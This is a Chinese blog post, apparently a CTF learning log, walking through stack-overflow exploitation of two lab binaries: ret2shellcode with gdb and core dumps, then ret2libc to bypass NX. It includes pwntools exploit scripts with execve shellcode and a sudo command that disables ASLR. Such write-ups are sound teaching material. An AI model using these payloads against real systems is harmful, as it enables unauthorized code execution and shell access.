@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang='default'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>pwn实践记录--rop入门 - shanah's blog</title>
+
+  
+    <meta name="description" content="pwn实践记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn实践记录--rop入门">
+<meta property="og:url" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="shanah&#39;s blog">
+<meta property="og:description" content="pwn实践记录">
+<meta property="og:locale">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/1.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/5.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/6.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/7.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/8.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/10.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/9.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/11.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/12.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/13.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/14.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/16.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/15.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/17.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/19.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/20.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/21.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/22.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.png">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/24.jpg">
+<meta property="og:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/25.jpg">
+<meta property="article:published_time" content="2020-03-07T21:43:55.000Z">
+<meta property="article:modified_time" content="2021-08-30T12:11:48.288Z">
+<meta property="article:author" content="shanah">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tonyshanc.github.io/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/1.jpg">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+  
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='w'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="title" href="/"><div class="main">shanah's blog</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/wiki/">项目</a><a class="nav-item" href="/notes/">导航</a><a class="nav-item" href="/about/">关于我</a></nav></header>
+
+<div class="widgets"><div class='widget-wrap' id='markdown'>
+  <div class='widget-header cap dis-select'>
+    <span class='name'>你好</span>
+  </div>
+  <div class='widget-body fs14'>
+    
+      <p>这里记录着我遇到的点点滴滴。</p>
+
+    
+      <p>bitter for sweeter</p>
+
+    
+  </div>
+</div>
+
+<div class="widget-wrap" id="recent"><div class="widget-header cap dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><div class="line"></div><a class="more-item" href="/2021/01/16/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6CAN%E6%80%BB%E7%BA%BF%E7%AC%94%E8%AE%B0/"><div class="cap"><time>2021-08-30</time></div><span class="title">CAN总线（一）</span></a><div class="line"></div><a class="more-item" href="/2020/11/18/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%A8%A1%E6%8B%9F%E5%B9%B3%E5%8F%B0carla%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%89%E8%A3%85/"><div class="cap"><time>2021-08-30</time></div><span class="title">自动驾驶模拟平台carla（一）安装</span></a><div class="line"></div><a class="more-item" href="/2020/11/25/%E5%89%91%E6%8C%87-Offer-04-%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/"><div class="cap"><time>2021-08-30</time></div><span class="title">剑指 Offer 04. 二维数组中的查找</span></a><div class="line"></div><a class="more-item" href="/2020/11/25/%E5%89%91%E6%8C%87offer03/"><div class="cap"><time>2021-08-30</time></div><span class="title">剑指offer03</span></a><div class="line"></div><a class="more-item" href="/2021/07/20/%E5%8F%88%E8%A7%81%E5%BF%AB%E4%B9%90%E6%95%B0/"><div class="cap"><time>2021-08-30</time><span>算法</span></div><span class="title">又见快乐数</span></a></div></div>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" title="GitHub" href="https://github.com/TonyShanc" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/">pwn实践记录--rop入门</a></div></div>
+
+<article class='content md w'>
+<h1 class="article-title"><span>pwn实践记录--rop入门</span></h1>
+<p>pwn实践记录</p>
+<span id="more"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/1.jpg" alt="1.jpg"><br>回过来记录入门历程主要是为了复习巩固pwn的分析思路。因为写的很详细，篇幅很长，未写完的会第二天写。全部内容包括：ret2shellcode、ret2libc(绕过NX)、ret2libc(绕过ASLR)、格式化字符串漏洞。若理解有错误，请在评论区指正，阿里嘎多。</p>
+<p>本次回顾涉及到的elf文件以及exp都能在<a target="_blank" rel="noopener" href="https://github.com/TonyShanc/new2pwn">这里</a>获取到。<br>环境准备：linux(32位程序运行环境)、IDA Pro、gdb插件、python+pwntools、不屈意志:)<br>知识回顾：<a target="_blank" rel="noopener" href="https://blog.csdn.net/RChaos/article/details/104344276">操作系统预防二进制漏洞的保护机制</a>、elf文件组成、栈机制、大小端。</p>
+<h4 id="0x00-return2shellcode"><a href="#0x00-return2shellcode" class="headerlink" title="0x00 return2shellcode"></a>0x00 return2shellcode</h4><p>文件：level1<br>习惯性查看保护机制：</p>
+<p>很好全关，接下来利用IDA Pro F5大法查看反汇编结果：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg" alt="3.jpg"><br>发现该二进制文件main函数入口直接调用vulnerable_function()函数，然后调用了write函数。这里提个醒，反汇编遇到write()、read()、puts()、gets()一定留个心眼，这些函数对任意变量的处理都可能造成栈溢出，不过本题输出的是字符串常量，忽略，直接查看vulnerable_function()。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg" alt="4.jpg"><br>看到该函数创建了个局部变量（数组指针），位置距离ebp-0x88的位置，也就是距离基指针136字节位置。read()函数读取了该函数的局部变量，上文提到read()函数不检查读取限制，并且局部变量存放在栈中，因此我们可以构造payload长度=136+4(存储ebp指针地址大小)+4(返回地址大小), 来改变函数返回地址。考虑到PIE已关，并且140字节的长度足够存储一个shellcode执行execve(“/bin/sh”)。因此我们从payload的开始位置存shellcode，剩下的用’A’补全，返回地址指向payload起始地址，也就是局部变量的起始地址。但是地址我们还不知道，因为它是在栈里面加载的。考虑到栈的动态变化，IDAPro的静态分析无法展示（它的动态分析比较麻烦），接下来用<strong>gdb配合peta插件</strong>进行动态分析：<br>在入口函数下断点：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/5.jpg" alt="5.jpg"><br>run/start 执行到main函数入口停下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/6.jpg" alt="6.jpg"><br>依次<br>next  next<br>在汇编下一步执行vulnerable_function()函数的时候，step命令进入函数内部：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/7.jpg" alt="7.jpg"><br>进入之后，我们就能看到该函数的栈情况了<br>接下来依次next 执行到read()函数的时候，象征性输入字符：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/8.jpg" alt="8.jpg"><br>可以看到栈区0xffffd060地址上存放了该局部变量（上面的0xffffd060是文字常量区（常量池）范围内的地址，主要存储字符串常量），至此所有的分析工作就完成了。</p>
+<p>接下来最最最关键的地方来了，很多初学者都会落进去的坑：其实gdb调试和实际执行程序的栈位置相比会有些偏移，为了提供buf更精确的位置，我们需要开启core dump功能来收集实际运行环境下的变量分布情况。<br>暂时开启core dump命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ulimit</span> -c unlimited</span><br></pre></td></tr></table></figure>
+<p>执行level1:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./level1</span><br></pre></td></tr></table></figure>
+<p>输入字符使栈溢出。<br>可以看到目录下多出来了个core文件。<br>接下来用gdb 配合core文件再次调试level1<br>然后输入<code>x $esp-144</code>查看buf的位置, 这里的esp指的是实际环境下程序执行出错的时候的esp, 执行返回命令时，esp退回到main函数的栈顶，因此buf的位置 = esp指针存的位置 - payload的长度(144)。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/10.jpg" alt="8.jpg"><br>得到buf实际地址：0xffffd0c0<br>接下来我们就能安心的写exp了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">ret = <span class="number">0xffffd0c0</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">&#x27;A&#x27;</span> * (<span class="number">140</span> - <span class="built_in">len</span>(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/9.jpg" alt="8.jpg"></p>
+<h4 id="0x01-ret2libc-绕过NX"><a href="#0x01-ret2libc-绕过NX" class="headerlink" title="0x01 ret2libc(绕过NX)"></a>0x01 ret2libc(绕过NX)</h4><p>文件：level2<br>保护：NX<br>查看保护机制：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/11.jpg" alt="8.jpg"><br>PIE(ASLR)是系统保护，有时查看文件保护机制虽然显示enabled , 但其实是开着的，保险起见，我们可以用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>或者多次ldd &lt;filename&gt;查看地址偏移情况:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd level2</span><br></pre></td></tr></table></figure>
+<p>修改用重定向就行了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>NX开启，栈数据段没有执行权限，因此不能将shellcode存在栈上。考虑到PIE(ASLR)没开，libc动态链接库中有execve()函数，并且存在”/bin/sh”字符串，接下来的思路就是覆盖返回地址，执行libc中的execve()或system(), 并将指向”/bin/sh”的指针作为函数的参数。<br>用IDA Pro打开，反汇编并整理成C代码，发现代码和上一题是一样的，知识NX没开；<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/3.jpg" alt="6.jpg"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/4.jpg" alt="6.jpg"><br>下面要做的工作是：调试level2，在libc动态链接库载入之后，找到两个系统函数和”/bin/sh”的地址。<br>在main()处设断点后，运行。<br>此时libc动态库已经载入了，然后用print 和 find命令分别查找函数和字符串的地址：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/12.jpg" alt="6.jpg"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/13.jpg" alt="6.jpg"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/14.jpg" alt="6.jpg"><br>下面是这道题的关键，传递的”/bin/sh”应该放在payload的哪个位置？<br>答：在返回地址的下一个高地址位。<br>这个问题我之前在调试信息里分析了好久，终于找到了比较合理的解释(后来才发现是我栈机制没完全看明白。。)。<br>我们先借助main()函数内部的write()调用过程来看看它的参数传递过程：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/16.jpg" alt="6.jpg"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/15.jpg" alt="6.jpg"><br>容易看出，执行call 0x8048340 &lt;write@plt&gt; (plt下一题会讲到) 后，栈中存进了该汇编指令的下一个指令的地址，也就是write()的返回地址。细看，又会发现write函数的三个参数，在调用call指令之前就已经压栈了，压栈顺序是参数从右到左的顺序。对应的汇编指令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x804843b &lt;main+14&gt;:	mov    DWORD PTR [esp+0x8],0xd</span><br><span class="line">0x8048443 &lt;main+22&gt;:	mov    DWORD PTR [esp+0x4],0x8048530</span><br><span class="line">0x804844b &lt;main+30&gt;:	mov    DWORD PTR [esp],0x1</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/17.jpg" alt="6.jpg"><br>因此可以这样总结：函数参数先逆序入栈，接下来才标记返回地址和执行被调用函数汇编指令。<br>分析完后，看看execve()和system()的传参要求：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int execve(const char *filename, char *const argv[], char *const envp[]);</span><br><span class="line">int system(const char * string);</span><br></pre></td></tr></table></figure>
+<p>发现system只要求一个文件名字符串指针，本着谁参数少欺负谁的态度，盘它！<br>构造payload: <code>payload = &#39;A&#39; *140 + sys_addr + &#39;A&#39; * 4 + binsh_addr</code><br>注意！这里’A’ * 4 是因为返回地址是直接到system函数内部的，没有经过call &lt;system@plt&gt;, 返回地址未压栈, 但是栈不知道，它还会认为有个返回地址，因此这里的‘A’ * 4是填补返回地址用的，如果你还想在返回时做进一步的事情，可以写个确切的地址。</p>
+<p>这里说一句：这里不用像上一题产生core dump ，因为返回地址不在栈中，没有地址偏移影响。<br>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10002)</span></span><br><span class="line">sys_addr=<span class="number">0xf7e138b0</span></span><br><span class="line">binsh_addr=<span class="number">0xf7f5e42d</span></span><br><span class="line">payload =  <span class="string">&#x27;A&#x27;</span>*<span class="number">140</span> + p32(sys_addr) + <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
